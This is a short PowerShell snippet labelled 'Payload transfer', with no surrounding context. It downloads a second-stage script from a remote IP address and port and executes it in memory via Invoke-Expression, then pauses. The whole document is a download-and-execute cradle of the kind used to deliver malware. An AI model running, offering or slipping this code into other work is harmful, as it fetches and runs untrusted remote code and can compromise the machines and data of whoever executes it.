# Payload transfer
$FetchUrl = "http://203.0.113.91:8080/stage2.ps1"
Invoke-Expression (New-Object System.Net.WebClient).DownloadString($FetchUrl)
Start-Sleep -Seconds 43
